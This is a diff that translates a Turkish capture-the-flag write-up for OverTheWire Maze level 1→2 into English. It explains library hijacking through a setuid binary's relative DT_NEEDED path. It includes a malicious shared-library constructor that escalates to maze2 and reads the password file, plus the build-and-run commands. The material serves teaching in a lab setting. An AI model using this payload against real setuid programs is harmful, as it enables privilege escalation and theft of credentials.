@@ -1,39 +1,48 @@
 # OverTheWire — Maze Level 1 → 2
 
-> Hedef: `maze1`'den `maze2` şifresi. Sonuç: **`**********`** (gizlendi)
-> Teknik: **Göreli yollu paylaşımlı kütüphane** (`DT_NEEDED = ./libc.so.4`) → CWD'den kütüphane enjeksiyonu (library hijacking).
+> Goal: Get `maze2` password from `maze1`. Result: **`**********`** (hidden)
+> Technique: **Shared library with a relative path** (`DT_NEEDED = ./libc.so.4`) → library
+> injection from CWD (library hijacking).
 
 ---
 
-## 1. Bağlantı & İlk Bakış
+## 1. Connection & First Look
 ```bash
 ssh maze1@maze.labs.overthewire.org -p 2225
 /maze/maze1
 # error while loading shared libraries: ./libc.so.4: cannot open shared object file
 ```
-Binary'nin `main`'i aslında sadece `puts("Hello World!")` yapıyor — sömürülecek mantık yok. İpucu hata mesajında.
+The binary's `main` simply calls `puts("Hello World!")` — no logic to exploit. The hint is in
+the error message.
 
-## 2. Analiz (`readelf -d`)
+## 2. Analysis (`readelf -d`)
 ```
-0x01 (NEEDED)  Shared library: [./libc.so.4]   <-- GÖRELİ YOL!
+0x01 (NEEDED)  Shared library: [./libc.so.4]   <-- RELATIVE PATH!
 0x01 (NEEDED)  Shared library: [libc.so.6]
 ```
-Binary, `./libc.so.4` adında bir kütüphaneye bağlı. Baştaki `./` → dinamik yükleyici onu **çalışma dizininden (CWD)** arar. Setuid binary olduğu için (`-r-sr-x--- maze2 maze1`), yüklenen kütüphanenin kodu **maze2 yetkisiyle** çalışır.
+The binary links against a library named `./libc.so.4`. The leading `./` causes the dynamic
+linker to look for it in the **current working directory (CWD)**. Since this is a setuid binary
+(`-r-sr-x--- maze2 maze1`), any library code it loads runs with **maze2 privileges**.
 
-## 3. Zafiyet
-Setuid bir programın, **saldırganın yazabildiği bir dizinden** kütüphane yüklemesi = doğrudan kod çalıştırma. Kütüphanenin `constructor`'ı `main`'den **önce**, yükleme sırasında koşar → maze2 olarak istediğimizi yaparız.
+## 3. Vulnerability
+A setuid program loading a library from **a directory the attacker can write to** = direct code
+execution. The library's `constructor` runs **before** `main`, at load time → we can do anything
+we want as maze2.
 
-> Dikkat: ilk denemede `Permission denied` aldım. Sebebi AT_SECURE değil, **dizin izniydi**: `mktemp -d` 0700/maze1 dizin yapar, binary euid maze2 ile çalıştığı için o dizine giremez. Dizini `711`, `.so`'yu `755` yapmak çözer.
+> Note: on the first attempt I got `Permission denied`. The reason was not AT_SECURE — it was a
+> **directory permission** issue: `mktemp -d` creates a 0700/maze1 directory, and the binary
+> runs as euid maze2 so it can't enter that directory. Making the directory `711` and the `.so`
+> `755` fixes it.
 
 ## 4. Exploit
-Kötü niyetli `./libc.so.4` (constructor'lı) derle, yazılabilir bir dizinde çalıştır:
+Compile a malicious `./libc.so.4` with a constructor, run it from a writable directory:
 ```c
 // fake.c
 #include <unistd.h>
 #include <stdlib.h>
 __attribute__((constructor))
 static void go(void){
-    setresuid(geteuid(),geteuid(),geteuid());   // ruid=euid=maze2 sabitle
+    setresuid(geteuid(),geteuid(),geteuid());   // lock ruid=euid=maze2
     system("id; cat /etc/maze_pass/maze2");
     _exit(0);
 }
@@ -42,16 +51,18 @@ static void go(void){
 D=/tmp/work; mkdir -p $D; chmod 711 $D; cd $D
 gcc -m32 -shared -fPIC -o libc.so.4 fake.c
 chmod 755 libc.so.4
-/maze/maze1            # CWD'deki sahte libc.so.4 yüklenir → constructor maze2 olarak koşar
-# uid=15002(maze2) ... <maze2 şifresi>
+/maze/maze1            # fake libc.so.4 from CWD is loaded → constructor runs as maze2
+# uid=15002(maze2) ... <maze2 password>
 ```
-Gerçek `libc.so.6` ikinci NEEDED olarak yüklendiği için `system`/`setresuid` çağrıları sorunsuz çözülür. `puts`/`__libc_start_main` lazy-binding olduğundan, biz `main`'e ulaşmadan `_exit` ettiğimiz için sahte kütüphanenin onları sağlamasına gerek yok.
+The real `libc.so.6` is the second NEEDED, so `system`/`setresuid` resolve without issue.
+`puts`/`__libc_start_main` are lazy-bound and we `_exit` before reaching `main`, so the fake
+library doesn't need to provide them.
 
-## Dersler
-| Konu | Not |
-|------|-----|
-| Göreli `DT_NEEDED` | `./lib...` veya RPATH `$ORIGIN`/`.` → CWD'den yükleme; setuid'de ölümcül |
-| Library hijacking | Yazılabilir dizin + setuid yükleyici = maze2 olarak kod |
-| `constructor` | `__attribute__((constructor))` `main`'den önce, yükleme anında çalışır |
-| İzin tuzağı | Setuid kurban hedef dizine **euid** ile girer; dizin `o+x` (`711`), dosya `o+r` olmalı |
-| Neden LD_PRELOAD değil | Setuid binary'ler AT_SECURE → `LD_PRELOAD`/`LD_LIBRARY_PATH` yok sayılır; ama binary'ye **gömülü** göreli yol uygulanır |
+## Lessons
+| Topic | Note |
+|-------|------|
+| Relative `DT_NEEDED` | `./lib...` or RPATH `$ORIGIN`/`.` → loads from CWD; fatal in setuid binaries |
+| Library hijacking | Writable directory + setuid loader = code as maze2 |
+| `constructor` | `__attribute__((constructor))` runs before `main`, at load time |
+| Permission trap | The setuid victim enters the target directory as **euid**; directory must be `o+x` (`711`), file `o+r` |
+| Why not LD_PRELOAD | Setuid binaries apply AT_SECURE → `LD_PRELOAD`/`LD_LIBRARY_PATH` are ignored; but **embedded** relative paths in the binary still apply |
